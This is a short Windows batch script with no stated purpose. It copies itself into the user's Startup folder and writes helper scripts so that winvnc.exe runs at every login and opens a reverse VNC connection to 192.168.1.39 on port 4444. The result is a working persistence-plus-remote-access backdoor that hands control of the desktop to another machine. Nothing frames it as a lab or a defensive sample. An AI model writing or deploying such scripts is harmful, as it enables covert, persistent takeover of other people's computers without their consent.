@echo off

REM Set the startup folder path
set startup_folder=%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup

REM Copy the batch file itself to the startup folder if it doesn't already exist
if not exist "%startup_folder%\%~nx0" (
  copy "%~f0" "%startup_folder%\"
)

REM Determine the directory where this batch file is located
set script_dir=%~dp0

REM Create the run_winvnc.bat script
(
  echo @echo off
  echo start winvnc.exe -run
  echo timeout /t 1 >nul
  echo winvnc.exe -connect 192.168.1.39::4444
) > "%script_dir%run_winvnc.bat"

REM Create the startup_winvnc.bat script in the startup folder
(
  echo @echo off
  echo cd /d "%script_dir%"
  echo call "%script_dir%run_winvnc.bat"
) > "%startup_folder%\startup_winvnc.bat"

REM Check if both batch files exist in their respective locations
if exist "%startup_folder%\startup_winvnc.bat" (
  echo startup_winvnc.bat created successfully in Startup folder.
) else (
  echo Failed to create startup_winvnc.bat in Startup folder.
)

if exist "%script_dir%run_winvnc.bat" (
  echo run_winvnc.bat created successfully in current directory.
) else (
  echo Failed to create run_winvnc.bat in current directory.
)
